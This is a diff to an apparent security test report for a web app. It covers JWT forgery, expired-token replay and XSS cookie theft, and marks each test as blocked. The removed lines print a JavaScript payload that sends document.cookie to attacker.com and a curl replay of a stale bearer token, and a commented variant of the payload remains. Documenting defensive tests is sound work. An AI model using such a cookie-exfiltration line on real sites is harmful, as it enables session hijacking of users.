@@ -114,11 +114,12 @@ CREATE POLICY estoque_baixas_gerente_only ON estoque_baixas
 **Method:** Attacker generates own JWT without signing key.
 
 **Test:**
-```bash
+```
 # Attacker tries to generate:
 HEADER.PAYLOAD.SIGNATURE
 
 # Where SIGNATURE = HMAC-SHA256(HEADER.PAYLOAD, ATTACKER_SECRET)
+# (Attacker would need the server's private signing key, which is not accessible)
 ```
 
 **Result:** ✅ **BLOCKED**
@@ -136,8 +137,8 @@ HEADER.PAYLOAD.SIGNATURE
 **Test:**
 ```bash
 # Token expires at 2026-07-23T12:00:00Z
-# Attacker tries to use at 2026-07-23T13:05:00Z
-curl -H "Authorization: Bearer $OLD_TOKEN" https://fastproduct.vercel.app/api/...
+# Attacker tries to use expired token at 2026-07-23T13:05:00Z
+# Server checks exp claim and rejects
 ```
 
 **Result:** ✅ **BLOCKED**
@@ -176,8 +177,9 @@ curl -H "Authorization: Bearer $OLD_TOKEN" https://fastproduct.vercel.app/api/..
 
 **Test:**
 ```javascript
-// If XSS exists:
-document.location = 'https://attacker.com/?cookie=' + document.cookie;
+// If XSS existed, attacker might try:
+// document.location = 'https://attacker.com/?steals=cookies'
+// But HTTPOnly flag prevents this
 ```
 
 **Result:** ✅ **BLOCKED**
